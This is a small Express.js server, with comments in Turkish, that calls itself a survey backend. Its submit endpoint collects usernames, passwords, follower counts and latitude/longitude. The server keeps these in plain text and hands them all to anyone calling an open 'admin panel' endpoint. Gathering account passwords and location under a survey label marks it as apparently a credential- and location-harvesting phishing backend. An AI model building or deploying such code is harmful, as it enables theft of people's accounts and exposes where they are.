const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

// JSON verilerini almak için
app.use(bodyParser.json());

// Anket verilerini saklamak için basit bir array
let surveyResults = [];

app.post('/submitSurvey', (req, res) => {
  const { username, password, followers, latitude, longitude } = req.body;

  // Verileri array'e ekliyoruz
  surveyResults.push({ username, password, followers, latitude, longitude });

  res.send({ message: 'Veri başarıyla alındı.' });
});

// Admin paneli için verileri gönderme
app.get('/getSurveyResults', (req, res) => {
  res.json({ results: surveyResults });
});

// Sunucuyu başlat
app.listen(port, () => {
  console.log(`Sunucu http://localhost:${port} adresinde çalışıyor.`);
});
